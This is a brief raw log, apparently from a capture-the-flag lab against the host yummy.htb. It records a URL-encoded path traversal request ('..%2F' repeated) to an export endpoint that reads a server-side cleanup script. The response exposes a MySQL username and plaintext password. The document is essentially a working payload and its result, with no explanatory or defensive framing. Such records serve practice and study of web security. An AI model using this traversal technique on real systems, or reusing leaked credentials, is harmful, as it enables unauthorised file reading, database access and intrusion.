URL: http://yummy.htb:80/export/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fscripts%2Ftable_cleanup.sh
Response:
#!/bin/sh

/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql
